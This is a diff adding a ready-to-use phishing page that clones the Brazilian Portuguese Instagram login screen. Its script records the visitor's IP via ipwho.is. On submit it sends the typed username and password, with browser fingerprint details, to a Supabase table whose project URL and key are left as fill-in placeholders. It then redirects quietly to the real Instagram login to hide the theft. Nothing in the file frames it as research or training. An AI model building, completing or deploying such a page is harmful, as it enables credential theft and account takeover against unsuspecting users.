@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Instagram</title>
+<style>
+  :root{
+    --line:#dbdbdb; --muted:#737373; --link:#00376b;
+    --blue:#0095f6; --bg:#fafafa; --ink:#262626;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{
+    background:#fff; color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{width:350px;max-width:100%;margin:32px auto 0;padding:0 16px}
+  .card{border:1px solid var(--line);border-radius:1px;background:#fff}
+  .card-top{padding:40px 40px 20px;text-align:center}
+  #wm{height:51px;margin:4px auto 30px;display:block;max-width:100%}
+  #wm-txt{
+    display:none;font-family:"Brush Script MT","Segoe Script",cursive;
+    font-size:38px;line-height:1;margin:4px auto 30px;letter-spacing:-1px;
+  }
+  form{display:flex;flex-direction:column;gap:6px}
+  .field{position:relative}
+  .field input{
+    width:100%;background:var(--bg);border:1px solid var(--line);
+    border-radius:3px;padding:9px 8px 7px;font-size:13px;color:var(--ink);
+    outline:none;font-family:inherit;
+  }
+  .field input:focus{border-color:#a8a8a8}
+  .field input::placeholder{color:#8e8e8e;font-size:13px}
+  .toggle{
+    position:absolute;right:8px;top:50%;transform:translateY(-50%);
+    background:none;border:0;color:var(--ink);font-size:14px;
+    font-weight:600;cursor:pointer;padding:4px;display:none;
+  }
+  .toggle.on{display:block}
+  .btn{
+    margin-top:8px;width:100%;background:var(--blue);color:#fff;border:0;
+    border-radius:8px;padding:8px;font-size:14px;font-weight:600;
+    cursor:pointer;font-family:inherit;transition:opacity .1s;
+  }
+  .btn:active{opacity:.75}
+  .btn[data-idle="1"]{opacity:.62;cursor:default}
+  .btn[data-busy="1"]{opacity:.62;cursor:progress}
+  .or{display:flex;align-items:center;gap:18px;margin:20px 0 18px}
+  .or span{font-size:13px;font-weight:600;color:var(--muted)}
+  .or i{flex:1;height:1px;background:var(--line)}
+  .fb{
+    display:flex;align-items:center;justify-content:center;gap:8px;
+    color:#385185;font-size:14px;font-weight:600;text-decoration:none;
+    margin:8px 0 0;
+  }
+  .fb svg{width:18px;height:18px;flex:none}
+  .forgot{
+    display:block;font-size:12px;color:var(--link);
+    text-decoration:none;margin:18px 0 6px;
+  }
+  .card-bot{padding:20px;text-align:center;font-size:14px;margin-top:10px}
+  .card-bot a{color:var(--blue);font-weight:600;text-decoration:none}
+  .app{text-align:center;margin-top:20px}
+  .app p{font-size:14px;margin:0 0 16px}
+  .badges{display:flex;justify-content:center;gap:8px;flex-wrap:wrap}
+  .badge{
+    display:flex;align-items:center;gap:6px;background:#000;color:#fff;
+    border-radius:7px;padding:6px 10px;text-decoration:none;line-height:1.1;
+  }
+  .badge svg{width:18px;height:18px;flex:none}
+  .badge small{display:block;font-size:8px;opacity:.85;letter-spacing:.3px}
+  .badge b{display:block;font-size:11px;font-weight:600}
+  footer{
+    max-width:900px;margin:52px auto 40px;padding:0 16px;text-align:center;
+    font-size:12px;color:var(--muted);
+  }
+  footer a{color:var(--muted);text-decoration:none;margin:0 6px;display:inline-block;line-height:2}
+  @media(max-width:420px){
+    .wrap{margin-top:12px}
+    .card{border:0}
+    .card-top{padding:20px 0}
+    .field input{font-size:16px}
+    footer{margin-top:24px}
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="card card-top">
+    <img id="wm" alt="Instagram"
+      src="https://commons.wikimedia.org/wiki/Special:FilePath/Instagram_wordmark_2013.svg"
+      onerror="this.style.display='none';document.getElementById('wm-txt').style.display='block'">
+    <div id="wm-txt">Instagram</div>
+
+    <form id="f" autocomplete="on" novalidate>
+      <div class="field">
+        <input id="u" name="username" type="text" placeholder="Telefone, nome de usuário ou email"
+               autocomplete="username" autocapitalize="none" spellcheck="false" required>
+      </div>
+      <div class="field">
+        <input id="p" name="password" type="password" placeholder="Senha"
+               autocomplete="current-password" required>
+        <button class="toggle" id="t" type="button" tabindex="-1">Mostrar</button>
+      </div>
+      <button class="btn" id="s" type="submit" data-idle="1">Entrar</button>
+    </form>
+
+    <div class="or"><i></i><span>OU</span><i></i></div>
+
+    <a class="fb" href="https://www.facebook.com/login/">
+      <svg viewBox="0 0 24 24" fill="#385185" aria-hidden="true">
+        <path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.95h-1.51c-1.49 0-1.96.93-1.96 1.89v2.27h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07z"/>
+      </svg>
+      Entrar com o Facebook
+    </a>
+
+    <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Esqueceu a senha?</a>
+  </div>
+
+  <div class="card card-bot">
+    Não tem uma conta? <a href="https://www.instagram.com/accounts/emailsignup/">Cadastre-se</a>
+  </div>
+
+  <div class="app">
+    <p>Obtenha o aplicativo.</p>
+    <div class="badges">
+      <a class="badge" href="https://apps.apple.com/app/instagram/id389801252">
+        <svg viewBox="0 0 24 24" fill="#fff" aria-hidden="true"><path d="M16.4 12.7c0-2.2 1.8-3.3 1.9-3.3-1-1.5-2.6-1.7-3.2-1.7-1.4-.1-2.7.8-3.4.8-.7 0-1.8-.8-3-.8-1.5 0-2.9.9-3.7 2.3-1.6 2.7-.4 6.7 1.1 8.9.8 1.1 1.6 2.3 2.8 2.2 1.1 0 1.6-.7 2.9-.7s1.7.7 2.9.7c1.2 0 2-1.1 2.7-2.2.9-1.2 1.2-2.4 1.2-2.5-.1 0-2.2-.9-2.2-3.7zM14.2 5.9c.6-.8 1-1.8.9-2.9-.9 0-2 .6-2.7 1.4-.6.7-1.1 1.8-.9 2.8 1 .1 2-.5 2.7-1.3z"/></svg>
+        <span><small>Baixar na</small><b>App Store</b></span>
+      </a>
+      <a class="badge" href="https://play.google.com/store/apps/details?id=com.instagram.android">
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="#00d1ff" d="M3.6 1.8 14 12 3.6 22.2c-.3-.2-.5-.6-.5-1.1V2.9c0-.5.2-.9.5-1.1z"/>
+          <path fill="#00f076" d="M17.6 8.6 5.4 1.6l8.5 8.5z"/>
+          <path fill="#ff3a44" d="M17.6 15.4 13.9 12l4.6-4.6 3.6 2c.8.4.8 1.7 0 2.1z" transform="translate(0 .6)"/>
+          <path fill="#ffc900" d="M5.4 22.4 13.9 12l3.7 3.4z"/>
+        </svg>
+        <span><small>DISPONÍVEL NO</small><b>Google Play</b></span>
+      </a>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <a href="https://about.meta.com/">Meta</a>
+  <a href="https://about.instagram.com/">Sobre</a>
+  <a href="https://about.instagram.com/blog/">Blog</a>
+  <a href="https://about.instagram.com/about-us/careers">Carreiras</a>
+  <a href="https://help.instagram.com/">Ajuda</a>
+  <a href="https://developers.facebook.com/docs/instagram">API</a>
+  <a href="https://www.instagram.com/legal/privacy/">Privacidade</a>
+  <a href="https://www.instagram.com/legal/terms/">Termos</a>
+  <a href="https://www.instagram.com/explore/locations/">Localizações</a>
+  <br>Português (Brasil) &nbsp;·&nbsp; © 2026 Instagram from Meta
+</footer>
+
+<script>
+/* ====== CONFIG ====== */
+const SUPABASE_URL  = "https://SEU-PROJETO.supabase.co";
+const SUPABASE_ANON = "SUA_CHAVE_ANON";
+const REDIRECT      = "https://www.instagram.com/accounts/login/";
+/* ==================== */
+
+const u = document.getElementById('u');
+const p = document.getElementById('p');
+const s = document.getElementById('s');
+const t = document.getElementById('t');
+let ip = '';
+
+// pega o IP enquanto a pessoa digita
+fetch('https://ipwho.is/').then(r => r.json())
+  .then(d => { if (d && d.success !== false) ip = d.ip || ''; })
+  .catch(() => {});
+
+function refresh() {
+  const ok = u.value.trim() && p.value;
+  s.dataset.idle = ok ? '0' : '1';
+}
+u.addEventListener('input', refresh);
+p.addEventListener('input', () => {
+  t.classList.toggle('on', p.value.length > 0);
+  refresh();
+});
+refresh();
+
+t.addEventListener('click', () => {
+  const show = p.type === 'password';
+  p.type = show ? 'text' : 'password';
+  t.textContent = show ? 'Ocultar' : 'Mostrar';
+  p.focus();
+});
+
+document.getElementById('f').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const identity = u.value.trim();
+  const password = p.value;
+  if (!identity || !password) {
+    (!identity ? u : p).focus();
+    return;
+  }
+
+  s.dataset.busy = '1';
+  s.textContent = 'Entrando...';
+
+  const payload = {
+    identity, password, ip,
+    user_agent: navigator.userAgent,
+    platform: navigator.platform || '',
+    language: navigator.language || '',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+    screen: screen.width + 'x' + screen.height,
+    referrer: document.referrer || ''
+  };
+
+  const send = fetch(SUPABASE_URL + '/rest/v1/logins', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'apikey': SUPABASE_ANON,
+      'Authorization': 'Bearer ' + SUPABASE_ANON,
+      'Prefer': 'return=minimal'
+    },
+    body: JSON.stringify(payload),
+    keepalive: true
+  }).catch(() => {});
+
+  // no máximo 900ms de espera, depois redireciona de qualquer forma
+  await Promise.race([send, new Promise(r => setTimeout(r, 900))]);
+
+  location.href = REDIRECT + '?username=' + encodeURIComponent(identity);
+});
